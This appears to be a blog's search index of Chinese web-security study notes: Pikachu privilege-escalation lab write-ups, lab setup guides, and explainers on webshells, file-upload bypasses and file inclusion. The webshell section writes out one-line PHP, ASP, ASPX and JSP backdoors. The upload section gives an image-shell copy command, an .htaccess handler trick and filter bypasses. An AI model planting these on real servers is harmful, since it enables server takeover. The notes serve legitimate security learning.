<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTML+前端+JavaScript</title>
    <url>/2021/06/24/HTML-%E5%89%8D%E7%AB%AF-JavaScript/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>web安全</category>
        <category>5.跨站脚本攻击</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Over Permission</title>
    <url>/2021/06/10/Over-Permission/</url>
    <content><![CDATA[<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作   </p>
<p>越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的                </p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方</p>
<p>后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则易出现越权漏洞</p>
<span id="more"></span>           

<h1 id="P1-水平越权"><a href="#P1-水平越权" class="headerlink" title="P1 水平越权"></a>P1 水平越权</h1><h2 id="S1-初步思考尝试"><a href="#S1-初步思考尝试" class="headerlink" title="S1 初步思考尝试"></a>S1 初步思考尝试</h2><p>—&gt;纯初学者，小白</p>
<p>—&gt;这部分较为繁琐，想看整理好的直接版本点击右侧目录</p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>点开题目进行观察</p>
<img src="/2021/06/10/Over-Permission/1.png" alt="1" style="zoom:67%;">

<p>初次见到的题型是在合天网安实验室中跟着指导书在实验机上做的题</p>
<p>他是在已知了一个人的账号后再去进行抓包观察修改等一系列操作</p>
<p>但这里直接是一个Login</p>
<p>1.我先随便输入了Username与Password，用Burp进行抓包观察，并无用处—&gt;想法错误</p>
<p>2.打开开发者工具，观察该题的php文件，发现了有用信息</p>
<img src="/2021/06/10/Over-Permission/2.png" alt="2" style="zoom:67%;">

<p>分别登录这三个账号，网页就是简单的个人介绍</p>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>登录Lili账号，点击查看个人信息，观察URL</p>
<p>/op1_mem.php?username=lili&amp;submit=点击查看个人信息</p>
<p>—&gt;那么如果将username修改为其他两个人，会是什么样</p>
<p>修改为username=lucy  username=kobe</p>
<p>发现网页跳转到了相应的人的信息页面中</p>
<p>=&gt;存在水平越权漏洞</p>
<h2 id="S2-总结"><a href="#S2-总结" class="headerlink" title="S2 总结"></a>S2 总结</h2><p>1.观察源代码知三个账号：lucy/123456，lili/123456，kobe/123456</p>
<p>2.登陆后点击”点击查看个人信息“</p>
<p>3.观察URL：通过GET请求，将要查询的用户信息传递给后台</p>
<p>localhost/pikachu-master/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=点击查看个人信息</p>
<p>4.将username修改为lucy,kobe，提交申请后即可查看两人信息</p>
<p>5.结论：存在水平越权漏洞</p>
<h1 id="P2垂直越权"><a href="#P2垂直越权" class="headerlink" title="P2垂直越权"></a>P2垂直越权</h1><h2 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>点开题目观察，与上一题图片一样</p>
<p>按照上一题的思路：</p>
<p>打开开发者工具查看源代码，得到两条用户信息</p>
<img src="/2021/06/10/Over-Permission/4.png" alt="4" style="zoom:67%;">

<h2 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h2><p>分别登录两个用户，进行观察</p>
<p>普通用户pikachu：</p>
<img src="/2021/06/10/Over-Permission/5.png" alt="5" style="zoom:67%;">

<p>超级用户admin：</p>
<img src="/2021/06/10/Over-Permission/6.png" alt="6" style="zoom:50%;">

<p>尝试修改URL无果</p>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>登录admin账号进行添加操作，并用burp进行抓包</p>
<img src="/2021/06/10/Over-Permission/7.png" alt="7" style="zoom:67%;">

<p>Cookie: PHPSESSID=4dl2v9a8o35dok7ght440s8477</p>
<p>登录普通用户</p>
<img src="/2021/06/10/Over-Permission/8.png" alt="8" style="zoom:80%;">

<p>Cookie: PHPSESSID=nd2k3u867n9578uf7dur3ch04s</p>
<p>将管理员添加用户的包发送给repeater</p>
<p>修改管理员的Cookie为普通用户的Cookie，发送</p>
<img src="/2021/06/10/Over-Permission/9.png" alt="9" style="zoom:80%;">

<p>发现以普通用户的身份进行了添加操作</p>
<img src="/2021/06/10/Over-Permission/10.png" alt="10" style="zoom:80%;">

<p>更改username，password，sex等数值，仍以普通用户登录的身份插入进去</p>
<p>=&gt;存在垂直越权</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>漏洞靶场练习</category>
        <category>Pikachu</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachu安装</title>
    <url>/2021/06/10/Pikachu%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。</p>
<span id="more"></span>

<h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><ul>
<li>Burt Force(暴力破解漏洞)</li>
<li>XSS(跨站脚本漏洞)</li>
<li>CSRF(跨站请求伪造)</li>
<li>SQL-Inject(SQL注入漏洞)</li>
<li>RCE(远程命令/代码执行)</li>
<li>Files Inclusion(文件包含漏洞)</li>
<li>Unsafe file downloads(不安全的文件下载)</li>
<li>Unsafe file uploads(不安全的文件上传)</li>
<li>Over Permisson(越权漏洞)</li>
<li>../../../(目录遍历)</li>
<li>I can see your ABC(敏感信息泄露)</li>
<li>PHP反序列化漏洞</li>
<li>XXE(XML External Entity attack)</li>
<li>不安全的URL重定向</li>
<li>SSRF(Server-Side Request Forgery)</li>
<li>管理工具</li>
<li>More…</li>
</ul>
<h1 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h1><h2 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h2><p>百度搜索phpstudy，选择合适的版本即可</p>
<p><a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p>
<p>安装好后界面（几个服务都是关闭状态，需手动开启）：</p>
<img src="/2021/06/10/Pikachu%E5%AE%89%E8%A3%85/1.png" style="zoom:38%;">

<h2 id="下载pikachu"><a href="#下载pikachu" class="headerlink" title="下载pikachu"></a>下载pikachu</h2><p>github地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<p>下载好后将解压后的文件夹放在\phpstudy_pro\WWW下</p>
<h2 id="使用pikachu靶场"><a href="#使用pikachu靶场" class="headerlink" title="使用pikachu靶场"></a>使用pikachu靶场</h2><p>打开phpstudy的面板将Apache跟MySQL启动</p>
<p>修改\phpstudy_pro\WWW\pikachu-master\inc\config.inc.php中的数据库密码（一般都为“root”）</p>
<p>打开浏览器输入localhost/pikachu-master/index.php进行访问</p>
<img src="/2021/06/10/Pikachu%E5%AE%89%E8%A3%85/2.png" alt="2" style="zoom:75%;">

<p>点击红色提示进行初始化</p>
<img src="/2021/06/10/Pikachu%E5%AE%89%E8%A3%85/3.png" alt="3" style="zoom:67%;">

<p>即可开始使用靶场</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>漏洞靶场练习</category>
        <category>Pikachu</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Webug安装</title>
    <url>/2021/06/11/Webug%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>WeBug名称定义为“我们的漏洞”靶场环境<br>基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境</p>
<span id="more"></span>

<h1 id="安装虚拟机VMWare"><a href="#安装虚拟机VMWare" class="headerlink" title="安装虚拟机VMWare"></a>安装虚拟机VMWare</h1><p>官方下载地址：<a href="https://www.vmware.com/cn/products/workstation-pro.html">Windows 虚拟机 | Workstation Pro | VMware | CN</a></p>
<p>下载后的仅为试用版</p>
<p>需后续破解—&gt;百度查询</p>
<h1 id="下载Webug"><a href="#下载Webug" class="headerlink" title="下载Webug"></a>下载Webug</h1><p>官方网站现已打不开</p>
<p>好多文章下附的百度网盘链接都已失效</p>
<p>推荐github下载</p>
<p>github地址：<a href="https://github.com/wangai3176/webug4.0">GitHub - wangai3176/webug4.0: webug4.0</a></p>
<p>—&gt;不要直接下载git上传的zip，看readme后面分享的链接</p>
<h1 id="使用Webug"><a href="#使用Webug" class="headerlink" title="使用Webug"></a>使用Webug</h1><p>解压下载好的文件：</p>
<img src="/2021/06/11/Webug%E5%AE%89%E8%A3%85/1.png" style="zoom:67%;">

<p>点开Windows Server 2003 Enterprise Edition</p>
<p>找到Windows Server 2003 Enterprise Edition.vmx</p>
<p>使用VMWare打开</p>
<p>页面为Win2003系统页面（登录界面密码为空）</p>
<img src="/2021/06/11/Webug%E5%AE%89%E8%A3%85/2.png" alt="2" style="zoom:50%;">

<p>Win+r进入cmd</p>
<p>输入指令ipconfig查询虚拟机的ip地址（192.168.XX.XX）</p>
<p>回到主机，打开浏览器，访问刚刚的IP</p>
<img src="/2021/06/11/Webug%E5%AE%89%E8%A3%85/3.png" style="zoom:50%;">

<p>用户名密码均为admin</p>
<p>登陆后进入Webug靶场</p>
<img src="/2021/06/11/Webug%E5%AE%89%E8%A3%85/4.png" alt="4" style="zoom:50%;">



<h1 id="源码方式"><a href="#源码方式" class="headerlink" title="源码方式"></a>源码方式</h1><p>按Webug中的readme知</p>
<p>还有一种类似于Pikachu靶场搭建的方法，不需要虚拟机</p>
<p>但最终结果是</p>
<p>显示login界面，但登陆后就是空白页面</p>
<p>未寻找到答案</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>漏洞靶场练习</category>
        <category>Webug4.0</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell</title>
    <url>/2021/06/23/webshell/</url>
    <content><![CDATA[<p>webshell基本介绍与管理工具介绍</p>
<span id="more"></span>

<h1 id="Webshell基本介绍"><a href="#Webshell基本介绍" class="headerlink" title="Webshell基本介绍"></a>Webshell基本介绍</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>webshell是以asp、php、jsp(Java)等网页文件形式存在的一种命令执行环境，也可以称为一种网页木马后门</p>
<p>木马：一些程序设计人员在其可从网络上下载的应用程序或游戏中，包含了可以控制用户计算机系统的程序，可能</p>
<p>​           造成用户的系统被破环甚至瘫痪</p>
<p>后门：一台计算机上有65535个端口，每个端口是计算机与外界连接所开启 的“门”，每个门都有计算机提供的一些</p>
<p>​            服务，攻击者利用这些服务， 获取服务器的权限，给自己进入计算机留下一个后门</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="根据文件大小分类"><a href="#根据文件大小分类" class="headerlink" title="根据文件大小分类"></a>根据文件大小分类</h3><p>一句话木马：代码简短，通常只有一行代码，使用方便 </p>
<p>小马：只包含文件上传功能，体积小 </p>
<p>大马：体积大，包含很多功能，代码通常会进行加密隐藏</p>
<h3 id="根据文件类型分类"><a href="#根据文件类型分类" class="headerlink" title="根据文件类型分类"></a>根据文件类型分类</h3><p>Jsp(Java)、asp、aspx(.net)、php</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>webshell大多以动态脚本形式出现 </p>
<p>webshell就是一个asp或php木马后门 </p>
<p>webshell可以穿越服务器防火墙，攻击者与被控服务器交换数据都是通过80端口传递 </p>
<p>webshell一般不会在系统日志中留下记录，只会在web日志中留下数据传递记录</p>
<h2 id="常见Webshell"><a href="#常见Webshell" class="headerlink" title="常见Webshell"></a>常见Webshell</h2><p>PHP：&lt;?php eval($_GET[pass]);? &gt;</p>
<p> ASP：&lt;%eval request(“pass”)%&gt; </p>
<p>ASPX：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”])%&gt; </p>
<p>JSP：&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;</p>
<h1 id="Webshell基本原理"><a href="#Webshell基本原理" class="headerlink" title="Webshell基本原理"></a>Webshell基本原理</h1><h2 id="可执行脚本"><a href="#可执行脚本" class="headerlink" title="可执行脚本"></a>可执行脚本</h2><p>eval:将字符串按照php代码执行（可将字符串转换为代码执行，并返回一个或多个值）</p>
<h2 id="数据传递"><a href="#数据传递" class="headerlink" title="数据传递"></a>数据传递</h2><p>HTTP数据包($_GET、$_POST、$_COOKIES)</p>
<h3 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h3><p>&lt; ?php eval($_GET[pass]);? &gt;</p>
<img src="/2021/06/23/webshell/1.png" alt="1" style="zoom:50%;">

<h3 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h3><p>&lt; ?php assert($_POST[pass]);? &gt;</p>
<img src="/2021/06/23/webshell/2.png" alt="2" style="zoom:50%;">

<h3 id="Cookie方式"><a href="#Cookie方式" class="headerlink" title="Cookie方式"></a>Cookie方式</h3><p>&lt; ?php @$a = $_COOKIE[1];@assert($a);? &gt;</p>
<img src="/2021/06/23/webshell/3.png" alt="3" style="zoom:50%;">

<h1 id="Webshell管理工具介绍"><a href="#Webshell管理工具介绍" class="headerlink" title="Webshell管理工具介绍"></a>Webshell管理工具介绍</h1><h2 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h2><p>AntSword 加载器：<a href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a> </p>
<p>AntSword 源码：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<img src="/2021/06/23/webshell/4.png" alt="4" style="zoom:50%;">

<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>下载地址： </p>
<p><a href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip</a></p>
<p> 使用介绍：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
<img src="/2021/06/23/webshell/5.png" alt="5" style="zoom:50%;">

<h2 id="执行命令解析"><a href="#执行命令解析" class="headerlink" title="执行命令解析"></a>执行命令解析</h2><img src="/2021/06/23/webshell/6.png" alt="6" style="zoom:50%;">

<p>z2是dir经过cknife的组合再经过base64编码后的结果</p>
<p>cknife通过eval执行action中的代码，把POST的z1和z2用base64_decode解码， 再把z1和z2组合成$r</p>
<p>最后用system执行$r，打印执行结果</p>
<img src="/2021/06/23/webshell/7.png" alt="7" style="zoom:50%;">

]]></content>
      <categories>
        <category>web安全</category>
        <category>4.文件上传</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>文件上传介绍，利用以及示例</p>
<span id="more"></span>

<h1 id="文件上传漏洞基本介绍"><a href="#文件上传漏洞基本介绍" class="headerlink" title="文件上传漏洞基本介绍"></a>文件上传漏洞基本介绍</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件上传：将客户端的文件上传到服务器的过程</p>
<p>eg：QQ空间发表说说上传的图片、招聘网上传简历、合天 网安实验室修改头像、将文件上传到网盘等</p>
<p>文件上传漏洞：上传文件的时候，如果服务器端后端语言未对上传的文件进行严格的验证和过滤，就容易造成上传</p>
<p>​                            任意文件的情况</p>
<p>​                            常见场景：web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意 </p>
<p>​                            代码并执行从而控制服务器</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>攻击者通过上传恶意文件传递给解释器去执行，然后就可以在服务器上执行恶意代码，进行数据库执行、服务器文</p>
<p>件管理、命令执行等恶意操作，从而控制整个网站，甚至是服务器</p>
<h2 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h2><p>客户端JavaScript检测（检测文件扩展名） </p>
<p>服务端MIME类型检测（检测content-type内容）</p>
<p>服务端目录路径检测（检测跟path参数相关的内容） </p>
<p>服务端文件扩展名检测 (检测跟文件extension相关的内容)  </p>
<p>服务端文件内容检测（检测内容是否合法是否含有恶意代码）</p>
<h2 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h2><ol>
<li>文件上传功能能正常使用 </li>
<li>上传文件路径可知 </li>
<li>上传文件可以被访问</li>
<li>上传文件可以被解析</li>
</ol>
<h1 id="客户端检测及绕过"><a href="#客户端检测及绕过" class="headerlink" title="客户端检测及绕过"></a>客户端检测及绕过</h1><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><p>通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="1" style="zoom:50%;">

<h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><p>在本地浏览器客户端禁用JS：可使用火狐浏览器的Noscript插件、浏览器禁用JS等方式实现</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="2" style="zoom:50%;">

<p>例如：upload-labs pass-01</p>
<h1 id="服务端检测及绕过"><a href="#服务端检测及绕过" class="headerlink" title="服务端检测及绕过"></a>服务端检测及绕过</h1><h2 id="服务端检测方式"><a href="#服务端检测方式" class="headerlink" title="服务端检测方式"></a>服务端检测方式</h2><p>服务端的代码通常检测三个点：MIME类型、文件后缀、文件内容</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="3" style="zoom:50%;">

<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>MIME (Multipurpose Internet Mail Extensions) ：描述消息内容类型的因特网标准</p>
<p>用来表示文档、文件或字节流的性质和格式</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="4" style="zoom:50%;">

<h4 id="常见MIME"><a href="#常见MIME" class="headerlink" title="常见MIME"></a>常见MIME</h4><p>超文本标记语言.html文件：text/html </p>
<p>普通文本.txt文件：text/plain </p>
<p>PDF文档.pdf：application/pdf </p>
<p>Microsoft Word文件.word：application/msword </p>
<p>PNG图像.png：image/png </p>
<p>GIF图像.gif：image/gif </p>
<p>MPEG文件.mpg、.mpeg：video/mpeg </p>
<p>AVI文件.avi：video/x-msvide</p>
<h4 id="MIME类型检测及绕过"><a href="#MIME类型检测及绕过" class="headerlink" title="MIME类型检测及绕过"></a>MIME类型检测及绕过</h4><p>检测：检测文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法 </p>
<p>绕过：用burpsuite截取并修改数据包中文件的content-type类型进行绕过</p>
<p>例如：upload-labs pass-02</p>
<h3 id="文件后缀黑名单检测"><a href="#文件后缀黑名单检测" class="headerlink" title="文件后缀黑名单检测"></a>文件后缀黑名单检测</h3><p>文件扩展名在黑名单中为不合法，一般有个专门的黑名单列表，里面会包含常见的危险文件后缀</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="5" style="zoom:50%;">

<p>例如：upload-labs pass-05</p>
<h4 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h4><p>在windows中，大小写是不敏感的，在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文</p>
<p>件，可以采用后缀名大小写绕过形式</p>
<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>如果代码文件没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过</p>
<h4 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h4><p>如果代码文件没有对后缀名进行去.处理，利用Windows系统的文件名特性，会自动去掉后缀名最后的.，通过在文件名后加.进行绕过</p>
<p>例如：upload-labs pass-07</p>
<h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p>如果代码文件没有对后缀名进行去::$DATA处理，利用Windows下NTFS文件系统的一个特性，可以在后缀名后</p>
<p>加::$DATA，绕过对黑名单的检测</p>
<p>例如：upload-labs pass-08</p>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>如果代码文件对黑名单后缀做去空处理，可以尝试使用双写的方式绕过检测</p>
<p>例如：upload-labs pass-10</p>
<h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title="htaccess文件"></a>htaccess文件</h4><p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p>
<p>比如新建一个.htaccess文件： </p>
<p>&lt;FilesMatch “as.png”&gt;</p>
<p>setHandler application/x-httpd-php  </p>
<p>&lt; /FilesMatch &gt;</p>
<p>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”as.png”这 个字符串的任意文件</p>
<p>所以无论文件名是什么样子，只要包含”as.png”这个字符串，都可以被以 php 的方式来解析</p>
<p>一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制</p>
<h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><p>文件扩展名不在白名单中为不合法</p>
<p>绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方式进行绕</p>
<p>​                   过，包括%00截断与0x00截断（php小于5.3.29）</p>
<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接 收到的不是%00字符，而</p>
<p>是%00解码后的内容，即解码成了0x00</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.png" alt="6" style="zoom:50%;">

<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/7.png" alt="7" style="zoom:50%;">

<p>例如：upload-labs pass-11</p>
<h4 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h4><p>系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束</p>
<p>但要注意是文件的十六进制内容里的00，而不是文件名中的00</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8.png" alt="8" style="zoom:50%;">

<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/9.png" alt="9" style="zoom:50%;">

<p>例如：upload-labs pass-12</p>
<h3 id="文件内容绕过"><a href="#文件内容绕过" class="headerlink" title="文件内容绕过"></a>文件内容绕过</h3><h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>一般通过检测文件内容来判断上传文件是否合法 </p>
<p>主要有两种检测方法</p>
<p> • 通过检测上传文件内容开始处的文件幻数来判断</p>
<p>​    通常情况下，通过判断前10个字节，基本就能判断出一个文件的真实类型</p>
<p> • 文件加载检测 一般是调用API或函数对文件进行加载测试</p>
<p>​    常见的是图像渲染测试，再严格点的甚至是进行 二次渲染</p>
<h5 id="文件幻数"><a href="#文件幻数" class="headerlink" title="文件幻数"></a>文件幻数</h5><p>文件格式幻数（magic number）</p>
<p>它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式</p>
<h6 id="图片文件幻数"><a href="#图片文件幻数" class="headerlink" title="图片文件幻数"></a>图片文件幻数</h6><img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/10.png" alt="10" style="zoom:50%;">

<h6 id="文件幻数绕过"><a href="#文件幻数绕过" class="headerlink" title="文件幻数绕过"></a>文件幻数绕过</h6><p>使用16进制编辑器打开一个图片，在图片后面插入一句话 </p>
<p>或cmd下执行：copy aaa.jpg /b + test.php /a shell.jpg</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/11.png" alt="11" style="zoom:80%;">

<p>例如：upload-labs pass-14</p>
<h3 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h3><p>源代码中是先将文件保存到文件夹后，再判断的文件后缀是否合法，不合法的删除</p>
<p>在多线程情况下，有可能出现文件夹中的文件还没处理完，我们就访问了原文件，这样就会导致绕过防护</p>
<img src="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/12.png" alt="12" style="zoom:50%;">

<p>例如：upload-labs pass-18</p>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><h3 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h3><p>形式：<a href="http://www.xxx/">www.xxx</a>. com /xx.asp/xx.jpg </p>
<p>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。</p>
<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>形式：<a href="http://www.xxx/">www.xxx</a>. com/ xx.asp; .jpg</p>
<p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了</p>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</p>
<p>比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把 nick.php.qwe.asd解析</p>
<p>成php</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>4.文件上传</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2021/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>文件包含漏洞介绍，利用及例子</p>
<span id="more"></span>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种</p>
<p>调用文件的过程⼀般被称为文件包含</p>
<p>这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统⼀：导航栏、底部 footer 栏等</p>
<h1 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h1><p>随着网站业务的需求，程序开发⼈员⼀般希望代码更灵活，所以将被包含的文件设置为变量， 用来进行动态调</p>
<p>用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做</p>
<p>合理的校验或者校验被绕过就造成了文件包含漏洞</p>
<h1 id="PHP中包含文件的函数"><a href="#PHP中包含文件的函数" class="headerlink" title="PHP中包含文件的函数"></a>PHP中包含文件的函数</h1><p>PHP中提供了四个文件包含的函数，分别是include()、include_once()、require() 和require_once()</p>
<ul>
<li>include：函数出现错误时，会抛出⼀个警告，程序继续运行</li>
<li>require：函数出现错误时，会直接报错并退出程序执行</li>
<li>include_once：函数出现错误时，会抛出警告，且仅包含⼀次</li>
<li>require_once：出错时直接退出；且仅包含⼀次</li>
</ul>
<p>在脚本执行期间同⼀个文件可能被多次引用，确保只包含⼀次以避免函数重定义、变量重新赋值等问题</p>
<p>几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞在 PHP 中居多，而在JSP、 ASP、ASP.NET程序中</p>
<p>非常少，甚至没有包含漏洞的存在</p>
<p>这与程序开发人员的水平无关，而问题在于语言设计的弊端</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol>
<li>泄露敏感信息 </li>
<li>获取服务器权限</li>
</ol>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>本地文件包含与远程文件包含</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>被包含的文件存在本地服务器上</p>
<p>本地文件包含可以包含本地敏感文件，也可以包含上传到本地的文件</p>
